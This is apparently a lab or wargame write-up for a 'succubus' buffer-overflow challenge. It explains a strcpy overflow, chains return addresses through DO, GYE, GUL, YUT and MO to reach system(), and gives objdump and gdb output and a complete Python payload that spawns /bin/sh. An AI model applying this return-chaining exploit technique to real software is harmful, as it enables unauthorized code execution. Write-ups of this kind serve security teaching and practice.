# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy function that does not check boundary so I can overwrite SFP and RET address.

But there is a protection code:
```c
// stack destroyer
// 100 : extra space for copied argv[1]
memset(buffer, 0, 44);
memset(buffer+48+100, 0, 0xbfffffff - (int)(buffer+48+100));

// LD_* eraser
// 40 : extra space for memset function
memset(buffer-3000, 0, 3000-40);
```
This code makes me not able to use stack address.

# Exploitation

```c
void MO(char *cmd)
{
  if(check != 4)
    exit(0);

  printf("welcome to the MO!\n");
	// olleh!
	system(cmd);
}

void YUT(void)
{
  if(check != 3)
    exit(0);

  printf("welcome to the YUT!\n");
  check = 4;
}

void GUL(void)
{
  if(check != 2)
    exit(0);

  printf("welcome to the GUL!\n");
  check = 3;
}

void GYE(void)
{
	if(check != 1)
		exit(0);

	printf("welcome to the GYE!\n");
	check = 2;
}

void DO(void)
{
	printf("welcome to the DO!\n");
	check = 1;
}
```
In this code, I have to call DO, GYE, GUL, YUT, MO continously to increase check that used in MO function which executes system function with cmd parameter.

When I give DO's address to RET's address, the DO will be called and after DO finished, next 4 bytes adress will be executed.

In that way, I can call functions countinously.

The payload will be:
```
------------------------------------------------------------------------------------------------------------------
| A(44) | DO's address | GYE's address | GUL's address | YUT's address | MO's address | AAAA | /bin/sh's address |
------------------------------------------------------------------------------------------------------------------
```

Get function's address by using objdump & grep:
```
[zombie_assassin@localhost zombie_assassin]$ objdump -d ./succubus | grep DO    
080487ec <DO>:
[zombie_assassin@localhost zombie_assassin]$ objdump -d ./succubus | grep GYE
080487bc <GYE>:
 80487c6:	74 0a                	je     80487d2 <GYE+0x16>
[zombie_assassin@localhost zombie_assassin]$ objdump -d ./succubus | grep GUL 
0804878c <GUL>:
 8048796:	74 0a                	je     80487a2 <GUL+0x16>
[zombie_assassin@localhost zombie_assassin]$ objdump -d ./succubus | grep YUT
0804875c <YUT>:
 8048766:	74 0a                	je     8048772 <YUT+0x16>
[zombie_assassin@localhost zombie_assassin]$ objdump -d ./succubus | grep MO 
08048724 <MO>:
 804872e:	74 10                	je     8048740 <MO+0x1c>
```

But there is a little problem, I cannot give "/bin/sh"'s address successfully because this program makes me not able to use library address(\x40).

So, I will give "/bin/sh" string in argv[1]'s last part and get that address then I can give that address in MO's param.

To know that address, give param like:
```
------------------------------------------
| MO's address | AAAA | BBBB | "/bin/sh" |
------------------------------------------
```
I found that address:
```
(gdb) x/10s $esp
0xbffffa94:	 "BBBB/bin/sh"
0xbffffaa0:	 "\b\210\004\b\002"
```
/bin/sh's address is 0xbffffa94.

# Payload
```python
import os

filename = "/home/zombie_assassin/succubus"

payload = ""
payload = payload + "A"*44
payload = payload + "\xec\x87\x04\x08" # DO's address
payload = payload + "\xbc\x87\x04\x08" # GYE's address
payload = payload + "\x8c\x87\x04\x08" # GUL's address
payload = payload + "\x5c\x87\x04\x08" # YUT's address
payload = payload + "\x24\x87\x04\x08" # MO's address
payload = payload + "AAAA" # MO's ret address
payload = payload + "\x68\xfa\xff\xbf" # /bin/sh's address
payload = payload + "/bin/sh" # give /bin/sh string to use as param

os.execv(filename, [filename, payload])
```
